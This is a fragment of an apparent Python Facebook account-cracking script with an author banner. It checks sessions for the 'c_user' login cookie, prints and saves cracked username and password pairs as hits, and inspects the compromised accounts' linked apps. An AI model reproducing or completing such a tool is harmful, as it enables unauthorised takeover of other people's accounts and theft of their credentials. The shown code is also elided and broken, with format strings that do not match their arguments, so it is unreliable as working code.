...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Ahmedalzwage
 [\x1b[1;96m+%s] Github   : https://Libya.pro
 [\x1b[1;96m+%s] Facebook : The King
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
		...
		try:
			...
			if 'c_user' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s • %s %s %s • %s'%(H,user,pw))
						cek_apk(coki)
						ok.append("%s • %s • %s %s %s • %s "%(user,pw))
